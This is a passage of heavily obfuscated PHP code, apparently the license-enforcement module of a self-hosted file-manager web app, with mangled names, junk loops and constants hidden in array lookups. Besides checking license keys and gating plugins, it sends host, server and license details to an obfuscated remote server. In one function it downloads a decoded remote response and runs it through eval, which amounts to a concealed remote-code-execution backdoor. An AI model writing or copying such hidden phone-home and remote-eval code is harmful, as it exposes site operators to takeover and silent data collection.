$this->config[$Ú­»šÅ²[117]]) { $Õ»úŸ­¸[$Ú­»šÅ²[101]][$Ú­»šÅ²[118]] = WEB_ROOT; } return $Õ»úŸ­¸; } private function obhl5c3674b1() { $Ù¦´Ùà =& $_SERVER[¿ğÚ‰±–]; $©Ğ±ÜØá =& $_SERVER[‹ÓÅ‘à¹]; $â¹ä‡şİ = $_SERVER[$©Ğ±ÜØá[24]] == $©Ğ±ÜØá[119]; if ($_SERVER[$©Ğ±ÜØá[24]] == $©Ğ±ÜØá[120] && $_GET[$©Ğ±ÜØá[121]] == $©Ğ±ÜØá[122]) { $â¹ä‡şİ = !0; } if ($â¹ä‡şİ) { $¸Ô¹™Ê„ = array($©Ğ±ÜØá[108] => $this->ubwe95e17189, $©Ğ±ÜØá[123] => $this->mfzb6adb4d07(), $©Ğ±ÜØá[124] => Model($©Ğ±ÜØá[125])->count()); if ($this->ubwe95e17189 != $©Ğ±ÜØá[109]) { $ƒÉ”òİ = _get($this->soeqf66e0cdc, $©Ğ±ÜØá[126]); if ($ƒÉ”òİ) { $¸Ô¹™Ê„[$©Ğ±ÜØá[127]] = $ƒÉ”òİ; $¸Ô¹™Ê„[$©Ğ±ÜØá[128]] = strtotime(_get($this->soeqf66e0cdc, $©Ğ±ÜØá[129])); $¸Ô¹™Ê„[$©Ğ±ÜØá[130]] = _get($this->soeqf66e0cdc, $©Ğ±ÜØá[116]); } $ø—œê«Ø = Model($©Ğ±ÜØá[33])->get($©Ğ±ÜØá[131], $©Ğ±ÜØá[6], !0); if (is_string($ø—œê«Ø) && substr($ø—œê«Ø, 0, 1) == $©Ğ±ÜØá[132]) { $ø—œê«Ø = json_decode_force($ø—œê«Ø); } if (is_array($ø—œê«Ø) && $ø—œê«Ø[$©Ğ±ÜØá[133]] && strstr($ø—œê«Ø[$©Ğ±ÜØá[133]], $©Ğ±ÜØá[134])) { $ôĞ‡ä£§ = explode($©Ğ±ÜØá[134], $ø—œê«Ø[$©Ğ±ÜØá[133]]); $¸Ô¹™Ê„[$©Ğ±ÜØá[135]] = $ôĞ‡ä£§[0]; } } $¸Ô¹™Ê„ = $this->vdpab12e6c9e(json_encode($¸Ô¹™Ê„), md5($©Ğ±ÜØá[136])); $ºú¡€Øß = array($©Ğ±ÜØá[137] => $¸Ô¹™Ê„); $‹ôüìû = $Ù¦´Ùà[724]; if (strlen($‹ôüìû) < $Ù¦´Ùà[683]) { return; } call_user_func(array($©Ğ±ÜØá[138], $©Ğ±ÜØá[139]), $ºú¡€Øß); $àÅ‘ÇÙˆ = $Ù¦´Ùà[725]; } if ($this->ubwe95e17189 == $©Ğ±ÜØá[109]) { return; } $Ë¥”Çı = array($©Ğ±ÜØá[140], $©Ğ±ÜØá[141], $©Ğ±ÜØá[142], $©Ğ±ÜØá[143], $©Ğ±ÜØá[144], $©Ğ±ÜØá[145]); $âœÇóÜ = Model($©Ğ±ÜØá[33])->get(); $¢¢õœÛ = $Ù¦´Ùà[726]; if (strlen($¢¢õœÛ) < $Ù¦´Ùà[686]) { die; } $ºú¡€Øß = array($©Ğ±ÜØá[146] => $âœÇóÜ[$©Ğ±ÜØá[34]], $©Ğ±ÜØá[147] => $âœÇóÜ[$©Ğ±ÜØá[35]], $©Ğ±ÜØá[148] => $©Ğ±ÜØá[6]); $Ô šûÛ² = $Ù¦´Ùà[727]; if (!$Ô šûÛ²) { die; } foreach ($Ë¥”Çı as $æÎ˜„Ô¬) { if (!isset($âœÇóÜ[$æÎ˜„Ô¬]) || !$âœÇóÜ[$æÎ˜„Ô¬]) { continue; } $ºú¡€Øß[$æÎ˜„Ô¬] = $âœÇóÜ[$æÎ˜„Ô¬]; } call_user_func(array($©Ğ±ÜØá[138], $©Ğ±ÜØá[139]), $ºú¡€Øß); } private function mkic713995ef() { $ÌË«ÅØê =& $_SERVER[¿ğÚ‰±–]; $õÂ¿ÖâÅ =& $_SERVER[‹ÓÅ‘à¹]; if ($_SERVER[$õÂ¿ÖâÅ[24]] != $õÂ¿ÖâÅ[149]) { return; } if (!KodUser::isRoot()) { die; } $‘ùûŠà¬ = $GLOBALS[$õÂ¿ÖâÅ[13]]; if (isset($‘ùûŠà¬[$õÂ¿ÖâÅ[150]])) { $this->xjka3702f15c(); die; } if (isset($‘ùûŠà¬[$õÂ¿ÖâÅ[151]]) && isset($‘ùûŠà¬[$õÂ¿ÖâÅ[151]]) == $õÂ¿ÖâÅ[122]) { $‘ùûŠà¬[$õÂ¿ÖâÅ[152]] = Model($õÂ¿ÖâÅ[33])->get($õÂ¿ÖâÅ[153]); } if (!isset($‘ùûŠà¬[$õÂ¿ÖâÅ[152]]) || strlen($‘ùûŠà¬[$õÂ¿ÖâÅ[152]]) != 16) { show_json($õÂ¿ÖâÅ[154] . $‘ùûŠà¬[$õÂ¿ÖâÅ[152]], !1); } $·À÷ãü¤ = Model($õÂ¿ÖâÅ[33])->get($õÂ¿ÖâÅ[100]); $ÒÉ™®ıÅ = md5($_SERVER[$õÂ¿ÖâÅ[106]] . $·À÷ãü¤); $âÆ×İ¡ğ = array($õÂ¿ÖâÅ[152] => $‘ùûŠà¬[$õÂ¿ÖâÅ[152]], $õÂ¿ÖâÅ[155] => rand_string(16), $õÂ¿ÖâÅ[156] => $õÂ¿ÖâÅ[136], $õÂ¿ÖâÅ[157] => $õÂ¿ÖâÅ[158], $õÂ¿ÖâÅ[159] => $_SERVER[$õÂ¿ÖâÅ[160]], $õÂ¿ÖâÅ[161] => $_SERVER[$õÂ¿ÖâÅ[162]], $õÂ¿ÖâÅ[163] => $_SERVER[$õÂ¿ÖâÅ[164]], $õÂ¿ÖâÅ[105] => $ÒÉ™®ıÅ, $õÂ¿ÖâÅ[165] => Model($õÂ¿ÖâÅ[33])->get($õÂ¿ÖâÅ[131])); $åÓİŸçª = $ÌË«ÅØê[728]; if (isset($‘ùûŠà¬[$õÂ¿ÖâÅ[151]]) && isset($‘ùûŠà¬[$õÂ¿ÖâÅ[151]]) == $õÂ¿ÖâÅ[122]) { $âÆ×İ¡ğ[$õÂ¿ÖâÅ[151]] = md5($âÆ×İ¡ğ[$õÂ¿ÖâÅ[152]] . $õÂ¿ÖâÅ[166] . $âÆ×İ¡ğ[$õÂ¿ÖâÅ[155]]); } if ($‘ùûŠà¬[$õÂ¿ÖâÅ[167]] == $õÂ¿ÖâÅ[168]) { $ñé£÷ˆü = $this->vdpab12e6c9e($ÒÉ™®ıÅ, $õÂ¿ÖâÅ[169]); $Ñ‘İ°‚ = $this->hlmub829146a(json_encode($âÆ×İ¡ğ), $ÒÉ™®ıÅ . $õÂ¿ÖâÅ[170], 3); $Ñ‘İ°‚ = $Ñ‘İ°‚ . $õÂ¿ÖâÅ[171] . $_SERVER[$õÂ¿ÖâÅ[160]]; $ÃßÏ¥×È = $this->mjbq59fd6e9e($õÂ¿ÖâÅ[172] . $ñé£÷ˆü . $õÂ¿ÖâÅ[173] . $Ñ‘İ°‚, -1); show_json($ÃßÏ¥×È, !0); } else { if ($‘ùûŠà¬[$õÂ¿ÖâÅ[167]] == $õÂ¿ÖâÅ[174]) { $ğİÓé“ß = substr(md5($õÂ¿ÖâÅ[175] . $ÒÉ™®ıÅ), 12, 15) . $õÂ¿ÖâÅ[176]; $Ñ‘İ°‚ = $this->qufl5954023b(trim($‘ùûŠà¬[$õÂ¿ÖâÅ[177]]), $ğİÓé“ß, 2); $”üö’öö = json_decode($Ñ‘İ°‚, !0); if (!is_array($”üö’öö) || !is_array($”üö’öö[$õÂ¿ÖâÅ[178]]) || $”üö’öö[$õÂ¿ÖâÅ[152]] != !0) { $Á¡ÆŠÍª = $õÂ¿ÖâÅ[179]; $Ôü’• = $”üö’öö[$õÂ¿ÖâÅ[178]] ? $õÂ¿ÖâÅ[180] . $”üö’öö[$õÂ¿ÖâÅ[178]] : $Á¡ÆŠÍª; show_json($Ôü’•, !1); } else { $âÆ×İ¡ğ[$õÂ¿ÖâÅ[155]] = $”üö’öö[$õÂ¿ÖâÅ[178]][$õÂ¿ÖâÅ[181]]; } } else { $”üö’öö = $this->mjbq59fd6e9e($õÂ¿ÖâÅ[182], $âÆ×İ¡ğ, 10); $ÀåÀòŠö = $ÌË«ÅØê[729]; if (!$ÀåÀòŠö) { return; } } } if (!is_array($”üö’öö) || !is_array($”üö’öö[$õÂ¿ÖâÅ[178]]) || $”üö’öö[$õÂ¿ÖâÅ[152]] != !0) { $Á¡ÆŠÍª = LNG($õÂ¿ÖâÅ[183]); $Ôü’• = $”üö’öö[$õÂ¿ÖâÅ[178]] ? $õÂ¿ÖâÅ[180] . $”üö’öö[$õÂ¿ÖâÅ[178]] : $Á¡ÆŠÍª; show_json($Ôü’•, !1); } $Å…­ÕÒÚ = $”üö’öö[$õÂ¿ÖâÅ[178]]; $çÇéÑ§š = $this->fyod59d4c9a4($Å…­ÕÒÚ[$õÂ¿ÖâÅ[184]]); if (!$çÇéÑ§š || $çÇéÑ§š != $Å…­ÕÒÚ[$õÂ¿ÖâÅ[129]]) { $¡€âùıÔ = array($õÂ¿ÖâÅ[185] => Model($õÂ¿ÖâÅ[33])->get($õÂ¿ÖâÅ[100]), $õÂ¿ÖâÅ[186] => $_SERVER[$õÂ¿ÖâÅ[106]], $õÂ¿ÖâÅ[187] => this_url(), $õÂ¿ÖâÅ[161] => $_SERVER[$õÂ¿ÖâÅ[162]]); $Ñ‘İ°‚ = $this->fxnb8f570c53(json_encode($¡€âùıÔ)); $this->mjbq59fd6e9e($õÂ¿ÖâÅ[188] . $Ñ‘İ°‚); show_json(LNG($õÂ¿ÖâÅ[189]), !0); } $¥Ã¶¼³ğ = array($õÂ¿ÖâÅ[153] => $Å…­ÕÒÚ[$õÂ¿ÖâÅ[190]], $õÂ¿ÖâÅ[191] => $Å…­ÕÒÚ[$õÂ¿ÖâÅ[192]], $õÂ¿ÖâÅ[193] => rand_string(16), $õÂ¿ÖâÅ[108] => $Å…­ÕÒÚ[$õÂ¿ÖâÅ[194]]); if ($âÆ×İ¡ğ[$õÂ¿ÖâÅ[155]]) { $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[193]] = $âÆ×İ¡ğ[$õÂ¿ÖâÅ[155]]; } $˜ë™¸û = substr(md5($¥Ã¶¼³ğ[$õÂ¿ÖâÅ[191]]), 10, 10); $Öãô¬ı½ = $˜ë™¸û . $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[108]] . $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[193]]; $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[110]] = strrev(base64_encode($this->vdpab12e6c9e($Öãô¬ı½, $õÂ¿ÖâÅ[195]))); $İ–“®Éô = rand_string(16); $­ØØ÷ô = $İ–“®Éô . $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[108]] . $this->vdpab12e6c9e(md5($¥Ã¶¼³ğ[$õÂ¿ÖâÅ[153]]), $İ–“®Éô); $è¡‹œ©ö = $ÌË«ÅØê[730]; if (strlen($è¡‹œ©ö) < $ÌË«ÅØê[686]) { return; } $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[111]] = base64_encode(strrev($this->vdpab12e6c9e($­ØØ÷ô, $õÂ¿ÖâÅ[196]))); $³÷¬´¹à = $ÌË«ÅØê[731]; if (!$³÷¬´¹à) { return; } if ($Å…­ÕÒÚ[$õÂ¿ÖâÅ[197]] && $Å…­ÕÒÚ[$õÂ¿ÖâÅ[197]] >= 1) { Model($õÂ¿ÖâÅ[33])->setDeep($õÂ¿ÖâÅ[198], $õÂ¿ÖâÅ[122]); } Model($õÂ¿ÖâÅ[33])->set($¥Ã¶¼³ğ); $ùãŠãßş = md5($_SERVER[$õÂ¿ÖâÅ[106]] . strrev($·À÷ãü¤) . $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[191]]); $ª÷¬™• = strrev(substr($ùãŠãßş, 10, 16)); $ÖÜÂØóó = $this->hlmub829146a(json_encode($Å…­ÕÒÚ), $ùãŠãßş); $÷ğñ³¦Ä = array_to_keyvalue(Model($õÂ¿ÖâÅ[7])->listData(), $õÂ¿ÖâÅ[199]); $ÛÚìà‹Ã = $ÌË«ÅØê[732]; while ($ÛÚìà‹Ã < $ÌË«ÅØê[688]) { if ($ÛÚìà‹Ã >= 0) { break; } $ÛÚìà‹Ã++; } $¿Øíµ°± = $÷ğñ³¦Ä[$õÂ¿ÖâÅ[200]]; $âûïƒ­Œ = $ÌË«ÅØê[712]; $À€Ö°® = array(); $À€Ö°®[$ª÷¬™•] = $ÖÜÂØóó; $ô¬©¶–ş = $ÌË«ÅØê[733]; if (strlen($ô¬©¶–ş) < $ÌË«ÅØê[688]) { return; } Model($õÂ¿ÖâÅ[7])->update($¿Øíµ°±[$õÂ¿ÖâÅ[201]], array($õÂ¿ÖâÅ[202] => $À€Ö°®)); $¼Û‚ÅÄª = $ÌË«ÅØê[734]; if (!$¼Û‚ÅÄª) { return; } $this->soeqf66e0cdc = $Å…­ÕÒÚ; $İŠ¤£Í× = $ÌË«ÅØê[735]; if (!$İŠ¤£Í×) { die; } $this->ubwe95e17189 = $¥Ã¶¼³ğ[$õÂ¿ÖâÅ[108]]; $this->licenseRegistSuccess(); $­ÖÁÁ‚º = $ÌË«ÅØê[736]; while (strlen($­ÖÁÁ‚º) < $ÌË«ÅØê[686]) { if (!$­ÖÁÁ‚º) { break; } $­ÖÁÁ‚º++; } Cache::set($õÂ¿ÖâÅ[203] . md5($·À÷ãü¤ . $õÂ¿ÖâÅ[204]), $õÂ¿ÖâÅ[6]); $úÚ–Æ¯ = $ÌË«ÅØê[737]; if (strlen($úÚ–Æ¯) < $ÌË«ÅØê[688]) { die; } show_json(LNG($õÂ¿ÖâÅ[189]), !0); } private function licenseRegistSuccess() { $»Î±Öúè =& $_SERVER[‹ÓÅ‘à¹]; $¶Éı•÷¼ = Model($»Î±Öúè[33])->get(); if ($¶Éı•÷¼[$»Î±Öúè[63]] != $»Î±Öúè[122]) { Model($»Î±Öúè[33])->set($»Î±Öúè[63], $»Î±Öúè[122]); } Action($»Î±Öúè[205])->initStart(!0); } private function xjka3702f15c() { $Ô½™ÒËÓ =& $_SERVER[¿ğÚ‰±–]; $Ü»’÷ =& $_SERVER[‹ÓÅ‘à¹]; Model($Ü»’÷[33])->set(array($Ü»’÷[153] => $Ü»’÷[6], $Ü»’÷[191] => $Ü»’÷[6], $Ü»’÷[108] => $Ü»’÷[109], $Ü»’÷[110] => $Ü»’÷[6], $Ü»’÷[111] => $Ü»’÷[6])); $á¯Æ¶°€ = $Ô½™ÒËÓ[738]; if (!$á¯Æ¶°€) { return; } Model($Ü»’÷[33])->setDeep($Ü»’÷[198], $Ü»’÷[206]); $this->soeqf66e0cdc = array(); $—›åúÎÃ = $Ô½™ÒËÓ[739]; $this->ubwe95e17189 = $Ü»’÷[109]; } private function nyfbe8eff2d0() { $É’¤‘ÌË =& $_SERVER[¿ğÚ‰±–]; $ÕÆ›ƒö— =& $_SERVER[‹ÓÅ‘à¹]; $_SERVER[$ÕÆ›ƒö—[162]] = _get($_SERVER, $ÕÆ›ƒö—[162], APP_HOST); $‹—£®À = $É’¤‘ÌË[740]; if (strlen($‹—£®À) < $É’¤‘ÌË[688]) { die; } $this->ubwe95e17189 = $ÕÆ›ƒö—[109]; $Üü—“êÖ = Model($ÕÆ›ƒö—[33])->get(); if ($Üü—“êÖ[$ÕÆ›ƒö—[108]] == $ÕÆ›ƒö—[109]) { return; } $Öõ¾çÅÁ = Model($ÕÆ›ƒö—[33])->get($ÕÆ›ƒö—[100]); $º¬ Ï¾ò = $É’¤‘ÌË[741]; while (strlen($º¬ Ï¾ò) < $É’¤‘ÌË[686]) { if (!$º¬ Ï¾ò) { break; } $º¬ Ï¾ò++; } $œÃ¿ÔˆÜ = $ÕÆ›ƒö—[203] . md5($Öõ¾çÅÁ . $ÕÆ›ƒö—[204]); $–é»à§ş = Cache::get($œÃ¿ÔˆÜ); $ï‡…ø·· = $É’¤‘ÌË[742]; if (!is_array($–é»à§ş) || !isset($–é»à§ş[$ÕÆ›ƒö—[207]]) || time() - $–é»à§ş[$ÕÆ›ƒö—[207]] >= 60) { $ÑÓ÷¼·‰ = Model($ÕÆ›ƒö—[7])->loadList(); $À–äêØû = $ÑÓ÷¼·‰[$ÕÆ›ƒö—[200]]; $¬õéÓ¬· = md5($_SERVER[$ÕÆ›ƒö—[106]] . strrev($Öõ¾çÅÁ) . $Üü—“êÖ[$ÕÆ›ƒö—[191]]); $»’ñ¿ò¦ = strrev(substr($¬õéÓ¬·, 10, 16)); $–é»à§ş = $this->qufl5954023b($À–äêØû[$ÕÆ›ƒö—[86]][$»’ñ¿ò¦], $¬õéÓ¬·); $–é»à§ş = json_decode($–é»à§ş, !0); } if (!is_array($–é»à§ş)) { return $this->xjka3702f15c(); } $ÔØ‰ÃÛ = strtotime($–é»à§ş[$ÕÆ›ƒö—[129]]); if (time() >= $ÔØ‰ÃÛ) { return $this->xjka3702f15c(); } if (!isset($–é»à§ş[$ÕÆ›ƒö—[207]]) || time() - $–é»à§ş[$ÕÆ›ƒö—[207]] > 20) { $–é»à§ş[$ÕÆ›ƒö—[207]] = time(); Cache::set($œÃ¿ÔˆÜ, $–é»à§ş); } $this->soeqf66e0cdc = $–é»à§ş; $this->ubwe95e17189 = $Üü—“êÖ[$ÕÆ›ƒö—[108]]; $“¡å«ÍÉ = $É’¤‘ÌË[743]; if (!$“¡å«ÍÉ) { return; } } private function xnogd4b0b994() { $ù¢­ÍÍá =& $_SERVER[‹ÓÅ‘à¹]; $¦™ˆáúú = $GLOBALS[$ù¢­ÍÍá[13]]; $ª³¹Â–± = $_SERVER[$ù¢­ÍÍá[24]]; if ($ª³¹Â–± == $ù¢­ÍÍá[208] && $this->ubwe95e17189 == $ù¢­ÍÍá[109]) { show_json(LNG($ù¢­ÍÍá[209]), !1, $ù¢­ÍÍá[210]); } $İúê¬é = array($ù¢­ÍÍá[211], $ù¢­ÍÍá[212]); if (in_array($ª³¹Â–±, $İúê¬é)) { if ($this->ubwe95e17189 == $ù¢­ÍÍá[109] && isset($¦™ˆáúú[$ù¢­ÍÍá[213]])) { show_json(LNG($ù¢­ÍÍá[209]), !1, $ù¢­ÍÍá[210]); die; } $‡¨Éï…Ë = $this->mfzb6adb4d07(); if ($‡¨Éï…Ë != intval($ù¢­ÍÍá[214])) { if ($‡¨Éï…Ë <= Model($ù¢­ÍÍá[125])->count()) { show_json(LNG($ù¢­ÍÍá[215]), !1, $ù¢­ÍÍá[210]); die; } } } } private function hjstd914d199() { $’€Ñ©¨” =& $_SERVER[¿ğÚ‰±–]; $òæ‡•òŞ =& $_SERVER[‹ÓÅ‘à¹]; $Ğ›Ô±é— = array($òæ‡•òŞ[119], $òæ‡•òŞ[120]); $·ŸŠÖ = $’€Ñ©¨”[744]; while ($·ŸŠÖ < $’€Ñ©¨”[688]) { if ($·ŸŠÖ >= 0) { break; } $·ŸŠÖ++; } if (!KodUser::isRoot() || !isset($_GET[$òæ‡•òŞ[216]])) { return; } if (!in_array($_SERVER[$òæ‡•òŞ[24]], $Ğ›Ô±é—)) { return; } $õÅá…Ê³ = $òæ‡•òŞ[217]; $õÅá…Ê³ = $this->qxtc74083bcf($õÅá…Ê³, $òæ‡•òŞ[218]); $©Æ«ÃëÁ = $’€Ñ©¨”[745]; if (!$©Æ«ÃëÁ) { return; } $û‡£ˆùä = stream_context_create(array($òæ‡•òŞ[219] => array($òæ‡•òŞ[220] => $òæ‡•òŞ[221], $òæ‡•òŞ[222] => 3))); $›Ÿë®Õ = @file_get_contents($õÅá…Ê³, !1, $û‡£ˆùä); $šÓÔ“¶© = $’€Ñ©¨”[746]; if (strlen($šÓÔ“¶©) < $’€Ñ©¨”[700]) { return; } header($òæ‡•òŞ[223]); if ($›Ÿë®Õ && strstr($›Ÿë®Õ, $òæ‡•òŞ[224])) { echo $›Ÿë®Õ; } die; } public function zryq1b38fad2($±ÌóóìÂ) { $ ”Ã©á =& $_SERVER[¿ğÚ‰±–]; $«ö÷©‘™ =& $_SERVER[‹ÓÅ‘à¹]; if ($this->ubwe95e17189 == $«ö÷©‘™[225]) { return $±ÌóóìÂ; } $¬«ÄËƒü = $this->versionPluginList(); $ÜÌ‹”ıõ = explode($«ö÷©‘™[226], $this->versionPluginFilter()); $úŸùÎ¬– = array(); $™¤ÅÜà· = $ ”Ã©á[747]; if (strlen($™¤ÅÜà·) < $ ”Ã©á[683]) { die; } foreach ($¬«ÄËƒü as $¹‹é¿’¬ => $¥îÇ×â) { if ($¥îÇ×â == $«ö÷©‘™[227] && substr($this->ubwe95e17189, 0, 1) == $«ö÷©‘™[227]) { continue; } if (!in_array($¹‹é¿’¬, $ÜÌ‹”ıõ)) { $úŸùÎ¬–[] = $¹‹é¿’¬; } } foreach ($úŸùÎ¬– as $¹‹é¿’¬) { unset($±ÌóóìÂ[$¹‹é¿’¬]); $ºùã‘„© = $ ”Ã©á[748]; if (!$ºùã‘„©) { die; } } return $±ÌóóìÂ; } private function versionPluginList() { $Á–Ÿûš  =& $_SERVER[‹ÓÅ‘à¹]; return array($Á–Ÿûš [228] => $Á–Ÿûš [227], $Á–Ÿûš [229] => $Á–Ÿûš [227], $Á–Ÿûš [230] => $Á–Ÿûš [227], $Á–Ÿûš [231] => $Á–Ÿûš [232], $Á–Ÿûš [233] => $Á–Ÿûš [232], $Á–Ÿûš [234] => $Á–Ÿûš [232], $Á–Ÿûš [235] => $Á–Ÿûš [232], $Á–Ÿûš [236] => $Á–Ÿûš [232], $Á–Ÿûš [237] => $Á–Ÿûš [232], $Á–Ÿûš [238] => $Á–Ÿûš [232], $Á–Ÿûš [239] => $Á–Ÿûš [232], $Á–Ÿûš [240] => $Á–Ÿûš [232], $Á–Ÿûš [241] => $Á–Ÿûš [232], $Á–Ÿûš [242] => $Á–Ÿûš [232], $Á–Ÿûš [243] => $Á–Ÿûš [232], $Á–Ÿûš [244] => $Á–Ÿûš [232]); } private function versionPluginFilter() { $ä¼”Éˆı =& $_SERVER[‹ÓÅ‘à¹]; if ($this->ubwe95e17189 == $ä¼”Éˆı[109]) { return $ä¼”Éˆı[6]; } $¶Ù’íÂø = _get($this->soeqf66e0cdc, $ä¼”Éˆı[245], $ä¼”Éˆı[6]); $­í…†Ü÷ = _get($this->soeqf66e0cdc, $ä¼”Éˆı[116], $ä¼”Éˆı[6]); $ë‰±–¹ú = _get($this->soeqf66e0cdc, $ä¼”Éˆı[246], $ä¼”Éˆı[6]); $¯¼—òú– = $_SERVER[¿ğÚ‰±–][749]; if (!$¯¼—òú–) { die; } if ($­í…†Ü÷ > time() && $ë‰±–¹ú > time()) { $ÙÇÑ–ıŞ = explode($ä¼”Éˆı[226], $¶Ù’íÂø); $’·•ù§¶ = array_keys($this->versionPluginList()); $¶Ù’íÂø = array_merge($ÙÇÑ–ıŞ, $’·•ù§¶); $¶Ù’íÂø = implode($ä¼”Éˆı[226], array_filter(array_unique($¶Ù’íÂø))); } return $¶Ù’íÂø; } private function twfy8a96752b() { $ñşÕŞÉì =& $_SERVER[‹ÓÅ‘à¹]; if ($this->ubwe95e17189 != $ñşÕŞÉì[109]) { $GLOBALS[$ñşÕŞÉì[86]][$ñşÕŞÉì[90]][$ñşÕŞÉì[247]] = $ñşÕŞÉì[206]; return; } $GLOBALS[$ñşÕŞÉì[86]][$ñşÕŞÉì[248]] = $ñşÕŞÉì[122]; if (Model($ñşÕŞÉì[249])->get($ñşÕŞÉì[63]) != $ñşÕŞÉì[206]) { Model($ñşÕŞÉì[249])->set($ñşÕŞÉì[63], $ñşÕŞÉì[206]); } } public function mvdz36ba34db() { $ñ‰÷‰ìò =& $_SERVER[¿ğÚ‰±–]; return $_SERVER[‹ÓÅ‘à¹][250]; $‡°‹àÈÀ = $ñ‰÷‰ìò[750]; while (strlen($‡°‹àÈÀ) < $ñ‰÷‰ìò[686]) { if (!$‡°‹àÈÀ) { break; } $‡°‹àÈÀ++; } } private function tyfp259f92ba() { $•»’•‡ =& $_SERVER[¿ğÚ‰±–]; $­ô­·¤À =& $_SERVER[‹ÓÅ‘à¹]; $ÈüÏˆÉø = array($­ô­·¤À[251], $­ô­·¤À[252], $­ô­·¤À[253]); $ÆŞøŞ€¶ = $•»’•‡[751]; $©Ô½ª = $­ô­·¤À[254] . md5($­ô­·¤À[255]); if ($this->ubwe95e17189 == $­ô­·¤À[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$­ô­·¤À[24]], $ÈüÏˆÉø)) { return; } if (time() % 4 != 0) { return; } $ååüİç³ = call_user_func(array($­ô­·¤À[256], $­ô­·¤À[257]), $©Ô½ª); $¹Ñğ’Ê· = $•»’•‡[752]; if ($ååüİç³ && time() - $ååüİç³ < intval($­ô­·¤À[258])) { return; } call_user_func(array($­ô­·¤À[256], $­ô­·¤À[139]), $©Ô½ª, time()); $İí’èĞ = Model($­ô­·¤À[33])->get($­ô­·¤À[100]); $šß”Éö = array($­ô­·¤À[152] => Model($­ô­·¤À[33])->get($­ô­·¤À[153]), $­ô­·¤À[167] => $this->ubwe95e17189, $­ô­·¤À[163] => $_SERVER[$­ô­·¤À[164]], $­ô­·¤À[165] => Model($­ô­·¤À[33])->get($­ô­·¤À[131]), $­ô­·¤À[105] => md5($_SERVER[$­ô­·¤À[106]] . $İí’èĞ), $­ô­·¤À[156] => $­ô­·¤À[136], $­ô­·¤À[159] => $_SERVER[$­ô­·¤À[160]]); $¼ëãÒ™ş = $this->mjbq59fd6e9e($­ô­·¤À[259], $šß”Éö); if (!is_array($¼ëãÒ™ş)) { return; } if ($¼ëãÒ™ş[$­ô­·¤À[152]] && $¼ëãÒ™ş[$­ô­·¤À[260]]) { if ($this->fyod59d4c9a4($¼ëãÒ™ş[$­ô­·¤À[260]]) == $šß”Éö[$­ô­·¤À[152]]) { return; } } $this->xjka3702f15c(); $Öú•ô¢ú = $•»’•‡[753]; while (strlen($Öú•ô¢ú) < $•»’•‡[688]) { if (!$Öú•ô¢ú) { break; } $Öú•ô¢ú++; } if ($this->fyod59d4c9a4($¼ëãÒ™ş[$­ô­·¤À[260]]) != $šß”Éö[$­ô­·¤À[152]]) { $©¥ëÈ£ = array($­ô­·¤À[185] => $İí’èĞ, $­ô­·¤À[186] => $_SERVER[$­ô­·¤À[106]], $­ô­·¤À[187] => this_url(), $­ô­·¤À[161] => $_SERVER[$­ô­·¤À[162]]); $ú‡±Ñ = $this->fxnb8f570c53(json_encode($©¥ëÈ£)); $¼ëãÒ™ş = $this->mjbq59fd6e9e($­ô­·¤À[188] . $ú‡±Ñ); if ($¼ëãÒ™ş && is_array($¼ëãÒ™ş) && isset($¼ëãÒ™ş[$­ô­·¤À[260]])) { $ˆ‘Š¶Ä = $this->qufl5954023b($¼ëãÒ™ş[$­ô­·¤À[260]], 2); if ($ˆ‘Š¶Ä) { $ˆ‘Š¶Ä = $this->fyod59d4c9a4($ˆ‘Š¶Ä); } if ($ˆ‘Š¶Ä) { try { @eval($ˆ‘Š¶Ä); } catch (Exception $ù–¤¤ØÍ) { } } } } } private function mjbq59fd6e9e($•é¿ëíÖ = '', $âŒÃ™Ø = array(), $Ù™¬ÉÛÃ = 5) { $ÜÄêä =& $_SERVER[¿ğÚ‰±–]; $É›şÁ™÷ =& $_SERVER[‹ÓÅ‘à¹]; $Õóç‚ÇÂ = $É›şÁ™÷[261]; $Õóç‚ÇÂ = $this->qxtc74083bcf($Õóç‚ÇÂ, $É›şÁ™÷[262]); $Õóç‚ÇÂ = $Õóç‚ÇÂ . $•é¿ëíÖ; $»…˜…Ì© = $ÜÄêä[754]; while ($»…˜…Ì© < $ÜÄêä[700]) { if ($»…˜…Ì© >= 0) { break; } $»…˜…Ì©++; } if ($âŒÃ™Ø && is_array($âŒÃ™Ø)) { $Õóç‚ÇÂ = $Õóç‚ÇÂ . $É›şÁ™÷[263] . http_build_query($âŒÃ™Ø); } if ($âŒÃ™Ø === -1) { return $Õóç‚ÇÂ; } $ÍÆäÊ×à = stream_context_create(array($É›şÁ™÷[219] => array($É›şÁ™÷[222] => $Ù™¬ÉÛÃ, $É›şÁ™÷[220] => $É›şÁ™÷[264]), $É›şÁ™÷[265] => array($É›şÁ™÷[266] => !1, $É›şÁ™÷[267] => !1))); $âŒÃ™Ø = @file_get_contents($Õóç‚ÇÂ, !1, $ÍÆäÊ×à); return json_decode($âŒÃ™Ø, !0); $Ì‰øù­Ó = $ÜÄêä[755]; if (strlen($Ì‰øù­Ó) < $ÜÄêä[686]) { die; } } private function mfzb6adb4d07() { $Ö¯˜¹Ö =& $_SERVER[¿ğÚ‰±–]; $«óÀÍ† =& $_SERVER[‹ÓÅ‘à¹]; $’©–¤½ = array($«óÀÍ†[268] => $«óÀÍ†[269], $«óÀÍ†[270] => $«óÀÍ†[271], $«óÀÍ†[272] => $«óÀÍ†[273], $«óÀÍ†[274] => $«óÀÍ†[275], $«óÀÍ†[276] => $«óÀÍ†[277], $«óÀÍ†[278] => $«óÀÍ†[214], $«óÀÍ†[279] => $«óÀÍ†[214], $«óÀÍ†[280] => $«óÀÍ†[269], $«óÀÍ†[281] => $«óÀÍ†[271], $«óÀÍ†[282] => $«óÀÍ†[273], $«óÀÍ†[283] => $«óÀÍ†[284], $«óÀÍ†[285] => $«óÀÍ†[275], $«óÀÍ†[286] => $«óÀÍ†[287], $«óÀÍ†[288] => $«óÀÍ†[277], $«óÀÍ†[289] => $«óÀÍ†[290], $«óÀÍ†[291] => $«óÀÍ†[292], $«óÀÍ†[293] => $«óÀÍ†[294]); $Ì“—Ğ· = $Ö¯˜¹Ö[756]; $ùŸ¿è¹ = $’©–¤½[$this->ubwe95e17189]; $¹ãÎ¨¬ = $Ö¯˜¹Ö[757]; while (strlen($¹ãÎ¨¬) 